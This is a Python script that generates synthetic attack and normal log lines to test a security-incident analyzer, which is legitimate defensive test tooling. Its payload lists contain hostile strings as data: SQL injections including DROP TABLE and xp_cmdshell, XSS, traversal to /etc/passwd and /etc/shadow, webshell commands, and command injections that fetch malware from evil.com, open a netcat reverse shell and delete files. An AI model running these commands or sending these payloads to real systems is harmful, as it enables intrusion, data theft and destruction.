#!/usr/bin/env python3
"""
生成真实的安全事件日志数据集
用于测试 security_incident_analyzer.py
"""

import random
import datetime
from datetime import datetime, timedelta

# 攻击源IP
ATTACK_IPS = [
    "185.220.101.46",   # Tor出口节点
    "45.154.255.147",   # 恶意IP
    "91.121.87.18",     # 法国
    "103.35.74.12",     # 亚洲
    "192.168.100.50",   # 内部模拟
    "10.0.0.100",       # 内部模拟
]

# 目标IP
TARGET_SERVERS = [
    "192.168.1.10",
    "10.0.0.5",
    "172.16.0.8",
]

# 用户名字典
USERNAMES = [
    "root", "admin", "administrator", "ubuntu", "deploy", "www-data",
    "mysql", "postgres", "oracle", "git", "test", "guest", "ftpuser"
]

def generate_ssh_brute_force():
    """生成SSH暴力破解日志"""
    logs = []
    base_time = datetime(2024, 12, 15, 14, 0, 0)

    for i in range(500):
        timestamp = base_time + timedelta(seconds=i*3)
        ip = random.choice(ATTACK_IPS)
        user = random.choice(USERNAMES)

        if i % 10 == 9:  # 每10次尝试后断开
            log = f'{timestamp.strftime("%b %d %H:%M:%S")} server1 sshd[12345]: Connection closed by {ip} port 22 [preauth]'
        else:
            log = f'{timestamp.strftime("%b %d %H:%M:%S")} server1 sshd[12345]: Failed password for invalid user {user} from {ip} port {random.randint(10000, 60000)} ssh2'
        logs.append(log)

    return logs

def generate_sql_injection():
    """生成SQL注入攻击日志"""
    logs = []
    base_time = datetime(2024, 12, 15, 15, 0, 0)

    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "UNION SELECT username,password FROM users--",
        "'; DROP TABLE users--",
        "1 OR 1=1",
        "admin'--",
        "' OR ''='",
        "1; EXEC xp_cmdshell('whoami')--",
        "-1 UNION ALL SELECT @@version,user(),database()--",
        "1' ORDER BY 10--",
    ]

    for i, payload in enumerate(sql_payloads * 5):
        timestamp = base_time + timedelta(seconds=i*10)
        ip = random.choice(ATTACK_IPS)
        log = f'{timestamp.strftime("%Y-%m-%dT%H:%M:%S")+".000000+0800"} {ip} - - "{random.choice(["GET", "POST"])} /products.php?id={payload} HTTP/1.1" {random.choice([200, 500, 403])} {random.randint(100, 5000)}'
        logs.append(log)

    return logs

def generate_xss_attacks():
    """生成XSS攻击日志"""
    logs = []
    base_time = datetime(2024, 12, 15, 16, 0, 0)

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(document.cookie)",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<svg><x><animate onbegin=alert(1) attributeName=x></svg>",
    ]

    for i, payload in enumerate(xss_payloads * 3):
        timestamp = base_time + timedelta(seconds=i*15)
        ip = random.choice(ATTACK_IPS)
        encoded_payload = payload.replace("<", "%3C").replace(">", "%3E")
        log = f'{timestamp.strftime("%Y-%m-%dT%H:%M:%S")+".000000+0800"} {ip} - - "GET /search.php?q={encoded_payload} HTTP/1.1" 200 {random.randint(100, 1000)}'
        logs.append(log)

    return logs

def generate_path_traversal():
    """生成路径遍历攻击日志"""
    logs = []
    base_time = datetime(2024, 12, 15, 17, 0, 0)

    path_payloads = [
        "../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "%2e%2e/etc/passwd",
        "..%2f..%2fetc%2fshadow",
        "....//....//etc/passwd",
        "/../../etc/passwd",
        "..;/..;/etc/passwd",
    ]

    for i, payload in enumerate(path_payloads * 3):
        timestamp = base_time + timedelta(seconds=i*12)
        ip = random.choice(ATTACK_IPS)
        log = f'{timestamp.strftime("%Y-%m-%dT%H:%M:%S")+".000000+0800"} {ip} - - "GET /files/{payload} HTTP/1.1" {random.choice([200, 403, 404])} {random.randint(100, 3000)}'
        logs.append(log)

    return logs

def generate_webshell_activity():
    """生成WebShell活动日志"""
    logs = []
    base_time = datetime(2024, 12, 15, 18, 0, 0)

    for i in range(20):
        timestamp = base_time + timedelta(seconds=i*30)
        ip = random.choice(ATTACK_IPS)

        if i == 0:
            log = f'{timestamp.strftime("%Y-%m-%dT%H:%M:%S")+".000000+0800"} {ip} - - "POST /upload.php HTTP/1.1" 200 {random.randint(500, 2000)}'
        elif i == 5:
            log = f'{timestamp.strftime("%Y-%m-%dT%H:%M:%S")+".000000+0800"} {ip} - - "GET /uploads/shell.php HTTP/1.1" 200 {random.randint(100, 500)}'
        else:
            cmd = random.choice(["id", "whoami", "cat /etc/passwd", "ls -la", "pwd", "uname -a"])
            log = f'{timestamp.strftime("%Y-%m-%dT%H:%M:%S")+".000000+0800"} {ip} - - "GET /uploads/shell.php?cmd={cmd} HTTP/1.1" 200 {random.randint(50, 500)}'
        logs.append(log)

    return logs

def generate_command_injection():
    """生成命令注入攻击日志"""
    logs = []
    base_time = datetime(2024, 12, 15, 19, 0, 0)

    cmd_payloads = [
        ";cat /etc/passwd",
        "|ls /tmp",
        "`whoami`",
        "&& wget http://evil.com/malware",
        ";curl -O http://evil.com/backdoor",
        "|nc -e /bin/bash 192.168.1.1 4444",
        ";rm -rf /tmp/*",
    ]

    for i, payload in enumerate(cmd_payloads * 2):
        timestamp = base_time + timedelta(seconds=i*20)
        ip = random.choice(ATTACK_IPS)
        log = f'{timestamp.strftime("%Y-%m-%dT%H:%M:%S")+".000000+0800"} {ip} - - "GET /ping.php?host=8.8.8.8{payload} HTTP/1.1" {random.choice([200, 500])} {random.randint(100, 5000)}'
        logs.append(log)

    return logs

def generate_privilege_escalation():
    """生成权限提升日志"""
    logs = []
    base_time = datetime(2024, 12, 15, 20, 0, 0)

    events = [
        ("authentication failure", "MEDIUM"),
        ("check pass; user unknown", "MEDIUM"),
        ("command not allowed", "HIGH"),
        ("Successful su for root by www-data", "HIGH"),
        ("new group with name 'attacker'", "HIGH"),
        ("new user with name 'hacker', UID 1001", "HIGH"),
        ("PAM: authentication failure", "MEDIUM"),
    ]

    for i, (event, level) in enumerate(events):
        timestamp = base_time + timedelta(minutes=i*10)
        log = f'{timestamp.strftime("%b %d %H:%M:%S")} server1 sudo[{random.randint(1000,9999)}]: {event}; TTY=pts/0; USER=root; COMMAND=/bin/bash'
        logs.append(log)

    return logs

def generate_normal_activity():
    """生成正常业务日志"""
    logs = []
    base_time = datetime(2024, 12, 15, 8, 0, 0)

    normal_ips = ["192.168.1.100", "192.168.1.101", "10.0.0.50"]

    for i in range(200):
        timestamp = base_time + timedelta(minutes=i*5)
        ip = random.choice(normal_ips)

        # 正常HTTP请求
        if i % 3 == 0:
            log = f'{timestamp.strftime("%Y-%m-%dT%H:%M:%S")+".000000+0800"} {ip} - - "GET /api/users HTTP/1.1" 200 {random.randint(100, 1000)}'
        elif i % 3 == 1:
            log = f'{timestamp.strftime("%Y-%m-%dT%H:%M:%S")+".000000+0800"} {ip} - - "POST /api/login HTTP/1.1" 200 {random.randint(50, 200)}'
        else:
            log = f'{timestamp.strftime("%b %d %H:%M:%S")} server1 systemd[1]: Started Session {i} of user deploy.'
        logs.append(log)

    return logs

def main():
    """生成所有日志"""
    print("生成安全事件测试数据集...")

    all_logs = []

    print("  - SSH暴力破解日志...")
    all_logs.extend(generate_ssh_brute_force())

    print("  - SQL注入日志...")
    all_logs.extend(generate_sql_injection())

    print("  - XSS攻击日志...")
    all_logs.extend(generate_xss_attacks())

    print("  - 路径遍历日志...")
    all_logs.extend(generate_path_traversal())

    print("  - WebShell活动日志...")
    all_logs.extend(generate_webshell_activity())

    print("  - 命令注入日志...")
    all_logs.extend(generate_command_injection())

    print("  - 权限提升日志...")
    all_logs.extend(generate_privilege_escalation())

    print("  - 正常业务日志...")
    all_logs.extend(generate_normal_activity())

    # 随机打乱日志顺序
    random.shuffle(all_logs)

    # 添加文件头
    header = """# ============================================================
# 真实安全事件数据集
# 生成时间: 2024-12-15
# 包含: SSH暴力破解、SQL注入、XSS、路径遍历、WebShell、命令注入、权限提升
# ============================================================
"""

    output_file = "logs/security_dataset.log"
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(header)
        f.write('\n'.join(all_logs))
        f.write('\n')

    print(f"\n完成！共生成 {len(all_logs)} 条日志")
    print(f"保存至: {output_file}")

if __name__ == "__main__":
    main()
